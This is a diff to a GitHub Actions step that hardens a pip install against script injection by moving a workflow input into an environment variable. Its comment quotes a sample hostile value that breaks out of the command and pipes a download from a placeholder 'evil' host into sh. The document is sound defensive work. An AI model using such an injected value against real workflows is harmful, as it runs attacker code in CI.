@@ -25,4 +25,13 @@ runs:
 
     - name: Install dependencies
       shell: bash
-      run: pip install -e ".[${{ inputs.install-extras }}]"
+      # Pass `install-extras` via env instead of direct `${{ }}`
+      # interpolation into the run script. The value becomes a bash
+      # variable `${SKIFF_EXTRAS}` that cannot break out of the
+      # `pip install -e ".[...]"` invocation even if a future caller
+      # passes a hostile value (e.g. `dev]"; curl evil | sh; "`).
+      # Gated today by CODEOWNERS on .github/, but zero-trust says
+      # don't trust the caller even when the caller is yourself.
+      env:
+        SKIFF_EXTRAS: ${{ inputs.install-extras }}
+      run: pip install -e ".[${SKIFF_EXTRAS}]"
